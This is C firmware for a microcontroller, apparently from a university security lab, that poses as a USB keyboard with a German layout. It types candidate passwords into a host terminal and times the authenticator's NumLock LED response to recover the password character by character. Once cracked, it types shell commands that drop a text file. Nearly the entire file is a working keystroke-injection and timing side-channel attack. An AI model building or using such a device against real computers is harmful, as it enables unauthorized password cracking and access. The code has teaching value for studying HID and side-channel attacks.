#include <string.h>

#include "KeyboardHID.h"

#include "german_keyboardCodes.h"



/* Macros: */

#define LED1 P1_1

#define LED2 P1_0

#define HID_KEYBOARD_MODIFIER_LEFTSHIFT   (1 << 1)

#define HID_KEYBOARD_MODIFIER_RIGHTALT   (1 << 6)



/* WHAT IS THIS EXAMPLE PROJECT DOING?

*

* the program implements a keyboard that types HELLO WORLD a few seconds after being plugged in.

* it uses the LUFA USB stack2 that comes together with the XMCLib.

*

* TODO: Extend this program to exploit the timing side channel of the authenticator to intelligently crack the password!

*

*/



//Zähler -> SysTick

int volatile hwCounter = 0;



//"Look-Up Table". Zugriff z,B. über charlib['D'][1] -> dann kommt 0 raus (int)

const char charlib[][3] = {

	['A'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_A},

	['B'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_B},

	['C'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_C},

	['D'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_D},

	['E'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_E},

	['F'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_F},

	['G'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_G},

	['H'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_H},

	['I'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_I},

	['J'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_J},

	['K'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_K},

	['L'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_L},

	['M'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_M},

	['N'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_N},

	['O'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_O},

	['P'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_P},

	['Q'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_Q},

	['R'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_R},

	['S'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_S},

	['T'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_T},

	['U'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_U},

	['V'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_V},

	['W'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_W},

	['X'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_X},

	['Y'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_Y},

	['Z'] = {HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0, GERMAN_KEYBOARD_SC_Z},

	['a'] = {0, 0, GERMAN_KEYBOARD_SC_A},

	['b'] = {0, 0, GERMAN_KEYBOARD_SC_B},

	['c'] = {0, 0, GERMAN_KEYBOARD_SC_C},

	['d'] = {0, 0, GERMAN_KEYBOARD_SC_D},

	['e'] = {0, 0, GERMAN_KEYBOARD_SC_E},

	['f'] = {0, 0, GERMAN_KEYBOARD_SC_F},

	['g'] = {0, 0, GERMAN_KEYBOARD_SC_G},

	['h'] = {0, 0, GERMAN_KEYBOARD_SC_H},

	['i'] = {0, 0, GERMAN_KEYBOARD_SC_I},

	['j'] = {0, 0, GERMAN_KEYBOARD_SC_J},

	['k'] = {0, 0, GERMAN_KEYBOARD_SC_K},

	['l'] = {0, 0, GERMAN_KEYBOARD_SC_L},

	['m'] = {0, 0, GERMAN_KEYBOARD_SC_M},

	['n'] = {0, 0, GERMAN_KEYBOARD_SC_N},

	['o'] = {0, 0, GERMAN_KEYBOARD_SC_O},

	['p'] = {0, 0, GERMAN_KEYBOARD_SC_P},

	['q'] = {0, 0, GERMAN_KEYBOARD_SC_Q},

	['r'] = {0, 0, GERMAN_KEYBOARD_SC_R},

	['s'] = {0, 0, GERMAN_KEYBOARD_SC_S},

	['t'] = {0, 0, GERMAN_KEYBOARD_SC_T},

	['u'] = {0, 0, GERMAN_KEYBOARD_SC_U},

	['v'] = {0, 0, GERMAN_KEYBOARD_SC_V},

	['w'] = {0, 0, GERMAN_KEYBOARD_SC_W},

	['x'] = {0, 0, GERMAN_KEYBOARD_SC_X},

	['y'] = {0, 0, GERMAN_KEYBOARD_SC_Y},

	['z'] = {0, 0, GERMAN_KEYBOARD_SC_Z},

	['1'] = {0, 0, GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION},

	['2'] = {0, 0, GERMAN_KEYBOARD_SC_2_AND_QUOTES},

	['3'] = {0, 0, GERMAN_KEYBOARD_SC_3_AND_PARAGRAPH},

	['4'] = {0, 0, GERMAN_KEYBOARD_SC_4_AND_DOLLAR},

	['5'] = {0, 0, GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE},

	['6'] = {0, 0, GERMAN_KEYBOARD_SC_6_AND_AMPERSAND},

	['7'] = { 0, 0,

			 	GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE},

	['8'] = { 0, 0,

			  GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET},

	['9'] = { 0, 0,

			  GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET},

	['0'] = {0, 0, GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE},

	['!'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_1_AND_EXCLAMATION },

	['@'] = { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

		 	  GERMAN_KEYBOARD_SC_Q },

	['#'] = { 0, 0, GERMAN_KEYBOARD_SC_HASHMARK_AND_APOSTROPHE},

	['\''] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

			   GERMAN_KEYBOARD_SC_HASHMARK_AND_APOSTROPHE },

	['$'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

			  GERMAN_KEYBOARD_SC_4_AND_DOLLAR },

	['%'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_5_AND_PERCENTAGE },

	['&'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_6_AND_AMPERSAND },

	['('] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

			  GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET},

	[')'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

  			  GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET},

    ['='] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE },

	['\"']= { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

			  GERMAN_KEYBOARD_SC_2_AND_QUOTES },

	['/'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE},

	['['] = { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

			  GERMAN_KEYBOARD_SC_8_AND_OPENING_PARENTHESIS_AND_OPENING_BRACKET},

	[']'] = { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

			  GERMAN_KEYBOARD_SC_9_AND_CLOSING_PARENTHESIS_AND_CLOSING_BRACKET},

	['{'] = { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

		      GERMAN_KEYBOARD_SC_7_AND_SLASH_AND_OPENING_BRACE },

	['}'] = { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

			  GERMAN_KEYBOARD_SC_0_AND_EQUAL_AND_CLOSING_BRACE },

	['?'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

			  GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH },

	['\\']= { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

			  GERMAN_KEYBOARD_SC_SHARP_S_AND_QUESTION_AND_BACKSLASH },

	['^'] = {0, 0, GERMAN_KEYBOARD_SC_CARET_AND_DEGREE},

    ['+'] = {0, 0, GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE},

	['*'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE },

	['~'] = { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

			  GERMAN_KEYBOARD_SC_PLUS_AND_ASTERISK_AND_TILDE },

    ['-'] = {0, 0, GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE },

    ['_'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_MINUS_AND_UNDERSCORE },

    [','] = {0, 0, GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON},

    [';'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

			  GERMAN_KEYBOARD_SC_COMMA_AND_SEMICOLON },

	['.'] = {0, 0, GERMAN_KEYBOARD_SC_DOT_AND_COLON},

    [':'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

			  GERMAN_KEYBOARD_SC_DOT_AND_COLON },

	['<'] = {0, 0, GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE},

	['>'] = { HID_KEYBOARD_MODIFIER_LEFTSHIFT, 0,

		 	  GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE },

	['|'] = { HID_KEYBOARD_MODIFIER_RIGHTALT, 0,

			  GERMAN_KEYBOARD_SC_LESS_THAN_AND_GREATER_THAN_AND_PIPE },

//	['\0']= {0, 0, GERMAN_KEYBOARD_SC_ENTER}, Avoid enter upon end of string

	['\n']= {0, 0, GERMAN_KEYBOARD_SC_ENTER},

	[' '] = {0, 0, GERMAN_KEYBOARD_SC_SPACE}

};



/* Clock configuration */

XMC_SCU_CLOCK_CONFIG_t clock_config = {

	.syspll_config.p_div  = 2,

	.syspll_config.n_div  = 80,

	.syspll_config.k_div  = 4,

	.syspll_config.mode   = XMC_SCU_CLOCK_SYSPLL_MODE_NORMAL,

	.syspll_config.clksrc = XMC_SCU_CLOCK_SYSPLLCLKSRC_OSCHP,

	.enable_oschp         = true,

	.calibration_mode     = XMC_SCU_CLOCK_FOFI_CALIBRATION_MODE_FACTORY,

	.fsys_clksrc          = XMC_SCU_CLOCK_SYSCLKSRC_PLL,

	.fsys_clkdiv          = 1,

	.fcpu_clkdiv          = 1,

	.fccu_clkdiv          = 1,

	.fperipheral_clkdiv   = 1

};



void MCUInit(){ //Configure & initialize MCU

  SystemInit();

	SysTick_Config(SystemCoreClock/1000); //SysTick 1ms konfigurieren

}



void SysTick_Handler(void){

  hwCounter++; //inkrementiert den Hardware hwCounter

}



/* Forward declaration of HID callbacks as defined by LUFA */

//die Funktionen sind unterhalb der main() implementiert, hier oben stehen nur die Funktionenköpfe



//________________________________________Funktionenköpfe____________________________________________



bool CALLBACK_HID_Device_CreateHIDReport(

							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,

							uint8_t* const ReportID,

							const uint8_t ReportType,

							void* ReportData,

							uint16_t* const ReportSize ); //Was ist ein HID report?!



void CALLBACK_HID_Device_ProcessHIDReport(

							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,

							const uint8_t ReportID,

							const uint8_t ReportType,

							const void* ReportData,

							const uint16_t ReportSize );



void SystemCoreClockSetup(void);





//________________________________________Funktionenköpfe____________________________________________



//Hilfsvariablen

char pwchars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!()-_+=~;:,.<>[]{}/?&$";



int crackedPW[21]; //mit Länge von 20 allozieren -> das wäre die maximale Länge des zu crackenden Passworts

//21 weil am Ende immer noch ende gedrückt werden muss



int charLibIndex = 0;

int correctCharLibIndex = 0;



int correctChar = 0; //wenn geratener Char richtig -> 1



int waitForInput = 0;



int pwIndex = 0;

int ausgabeFertig = 0;



unsigned int maxTime = 0;

unsigned int verifyingFinished = 0;



unsigned int isPasswordCracked = 0;



//Zum Droppen des Textfiles -> STRG+C?

unsigned char textfileZeile[] = "cd ~/\ncat > 03736578.txt\nGia-Phong Tran\n";





/**

 * Main program entry point. This routine configures the hardware required by

 * the application, then enters a loop to run the application tasks in sequence.

 */

int main(void) {

	// Init LED pins for debugging and NUM/CAPS visual report

	XMC_GPIO_SetMode(LED1,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);

	XMC_GPIO_SetMode(LED2,XMC_GPIO_MODE_OUTPUT_PUSH_PULL);



	MCUInit(); //init the SysTick clock

	USB_Init();



	// Wait until host has enumerated HID device

	for(int i = 0; i < 10e6/3; ++i); //kurze Wartezeit (vorgegeben)





	uint32_t pwCharsLength = (uint32_t) strlen(pwchars);



	while (1) {

		while((pwIndex <= 20) && (charLibIndex <= pwCharsLength) && (isPasswordCracked == 0)){



			crackedPW[pwIndex] = pwchars[charLibIndex]; //chars durchiterieren

			crackedPW[pwIndex+1] = '\n';





			while(ausgabeFertig == 0){ //muss in ner Schleife sein

				//hier werden application tasks in sequence gerunned

				HID_Device_USBTask(&Keyboard_HID_Interface);



			}



			//kurze Wartezeit für Terminal output

			for(int i = 0; i < 10e6/50; ++i);



			ausgabeFertig = 0;



			// Wichtig: Man muss abwarten, bis Verifying-Prozess durch ist!

			while(!verifyingFinished){

				XMC_GPIO_SetOutputHigh(LED2); //for debugging

			}





			//falls wir durch das Alphabet durch sind, dann Index erhöhen

			//und Alphabet neu durchgehen

			if(charLibIndex == pwCharsLength){

				crackedPW[pwIndex] = pwchars[correctCharLibIndex];

				pwIndex = pwIndex + 1;

				charLibIndex = -1;

			}



			//increment Char library index (A->Z)

			charLibIndex = charLibIndex + 1;



		}



		//Hier Dokument droppen

		while(1){

			HID_Device_USBTask(&Keyboard_HID_Interface);



			if(isPasswordCracked){

				XMC_GPIO_SetOutputHigh(LED1);

			}



		}





	}

}



// Callback function called when a new HID report needs to be created

//Ein Report ist ein struct (?) bestehend aus: Modifier, Reserved, KeyCode-Array

bool CALLBACK_HID_Device_CreateHIDReport(

							USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,

							uint8_t* const ReportID,

							const uint8_t ReportType,

							void* ReportData,

							uint16_t* const ReportSize )

							 {

	USB_KeyboardReport_Data_t* report = (USB_KeyboardReport_Data_t *)ReportData;

	*ReportSize = sizeof(USB_KeyboardReport_Data_t);



	//static local variables -> beim ersten Funtionenaufruf deklariert,

	//bei jedem weiteren Funktionenaufruf werden die Zeilen dann ignoriert

	static uint8_t characterSent = 0,

				   indexToSend = 0, indexToSendTextfile = 0;



//1.) Password Crack

	if((indexToSend < 21) && (isPasswordCracked == 0)) {

		if(characterSent) { //damit nur 1 char geprinted wird und nicht unendlich viele

			report->Modifier = 0;

			report->Reserved = 0;

			report->KeyCode[0] = 0;

			characterSent = 0;

			++indexToSend;



		} else { //Ausnutzung der "Lookup-Table"

			report->Modifier = charlib[crackedPW[indexToSend]][0];

			report->Reserved = charlib[crackedPW[indexToSend]][1];

			report->KeyCode[0] = charlib[crackedPW[indexToSend]][2];

			characterSent = 1;

		}

	}



	//2.) Send the malicious textfile

	if(isPasswordCracked){

		if(characterSent) { //damit nur 1 char geprinted wird und nicht unendlich viele

			report->Modifier = 0;

			report->Reserved = 0;

			report->KeyCode[0] = 0;

			characterSent = 0;

			++indexToSendTextfile;



		} else { //Ausnutzung der "Lookup-Table"

			report->Modifier = charlib[textfileZeile[indexToSendTextfile]][0];

			report->Reserved = charlib[textfileZeile[indexToSendTextfile]][1];

			report->KeyCode[0] = charlib[textfileZeile[indexToSendTextfile]][2];

			characterSent = 1;

		}

	}



	if(indexToSend >= (pwIndex + 2)){

		indexToSend = 0;

		ausgabeFertig = 1;

	}



	return true;

}



// Called on report input. For keyboard HID devices, that's the state of the LEDs

//Über USB wird also ein report erstellt. Für jeden Report-Input wird diese Funktion ausgeführt -> je nach HID device passiert was anderes

//Für "Keyboard HID devices" werden LEDs verändert

void CALLBACK_HID_Device_ProcessHIDReport(

						USB_ClassInfo_HID_Device_t* const HIDInterfaceInfo,

						const uint8_t ReportID,

						const uint8_t ReportType,

						const void* ReportData,

						const uint16_t ReportSize )

						 {

	uint8_t *report = (uint8_t*)ReportData;



	//LED1 -> das ist der timing side channel

	if(*report & HID_KEYBOARD_LED_NUMLOCK){

		XMC_GPIO_SetOutputHigh(LED1);

		verifyingFinished = 1;



		//remember max verifying-time while looping through the alphabet

		if(hwCounter > maxTime){

			maxTime = hwCounter;

			correctCharLibIndex = charLibIndex; //this is the longest charLibIndex

			XMC_GPIO_SetOutputHigh(LED2); //for debugging

		}



	}else{

		XMC_GPIO_SetOutputLow(LED1);

		hwCounter = 0;

		verifyingFinished = 0;

	}





		//LED2 -> leuchtet auf wenn Password gebreached

	if(*report & HID_KEYBOARD_LED_CAPSLOCK){

		XMC_GPIO_SetOutputHigh(LED2);

		isPasswordCracked = 1;

	}

	else{

		XMC_GPIO_SetOutputLow(LED2);

	}



}



void SystemCoreClockSetup(void) {

	/* Setup settings for USB clock */

	XMC_SCU_CLOCK_Init(&clock_config);



	XMC_SCU_CLOCK_EnableUsbPll();

	XMC_SCU_CLOCK_StartUsbPll(2, 64);

	XMC_SCU_CLOCK_SetUsbClockDivider(4);

	XMC_SCU_CLOCK_SetUsbClockSource(XMC_SCU_CLOCK_USBCLKSRC_USBPLL);

	XMC_SCU_CLOCK_EnableClock(XMC_SCU_CLOCK_USB);



	SystemCoreClockUpdate();

}

